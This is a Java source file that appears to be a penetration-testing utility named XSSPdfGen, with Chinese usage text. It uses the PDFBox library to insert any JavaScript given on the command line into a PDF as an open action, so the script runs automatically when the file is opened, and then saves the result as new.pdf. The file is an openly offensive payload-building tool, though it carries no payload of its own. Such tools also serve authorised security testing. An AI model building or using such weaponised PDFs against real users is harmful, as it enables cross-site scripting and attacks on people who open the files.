package com.caijisec;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;

import org.apache.pdfbox.Loader;
import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.pdmodel.PDPage;
import org.apache.pdfbox.pdmodel.interactive.action.PDActionJavaScript;
public class XSSPdfGen {
    public static void main(String args[]) throws Exception {
        if (args.length != 2){
            System.out.println("用法：\n\tjava -jar xxx.jar <需要插入脚本的pdf文件名> <插入的脚本>");
            System.exit(0);
        }
        String oldPdfFileName = args[0];
        String javaScript = args[1];
        String newPdfFileName = "new.pdf";

        File oldPdfFile = new File(oldPdfFileName);
        File newPdfFile = new File(newPdfFileName);

        PDDocument document = null;
        if (oldPdfFile.exists()){
            System.out.println("提供的文件 " + oldPdfFileName + " 存在！");
            try {
                document = Loader.loadPDF(oldPdfFile);
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("提供的文件 " + oldPdfFileName + " 不存在，新建pdf文档！");
            document = new PDDocument();
            PDPage pdPage = new PDPage();
            document.addPage(pdPage);
        }

        System.out.println("要插入的代码：" + javaScript);
        PDActionJavaScript PDAjavascript = new PDActionJavaScript(javaScript);
        document.getDocumentCatalog().setOpenAction(PDAjavascript);
        if (newPdfFile.exists()){
            System.out.println(newPdfFileName + " 文件已存在！");
            while (true) {
                System.out.print("请输入新的文件名，或者输入 c 继续，继续会覆盖已有文件【" + newPdfFileName + "】：");
                BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
                String newNewPdfFileName = br.readLine();
                if (newNewPdfFileName.equals("c")) {
                    break;
                } else {
                    if (!newNewPdfFileName.endsWith(".pdf")) {
                        newNewPdfFileName = newNewPdfFileName + ".pdf";
                    }
                    if (new File(newNewPdfFileName).exists()) {
                        System.out.println(newNewPdfFileName + " 文件也已存在！");
                    } else {
                        newPdfFileName = newNewPdfFileName;
                        break;
                    }
                }
            }
        }

        document.save(new File(newPdfFileName));
        System.out.println("输出文件：" + newPdfFileName);
        document.close();
    }
}
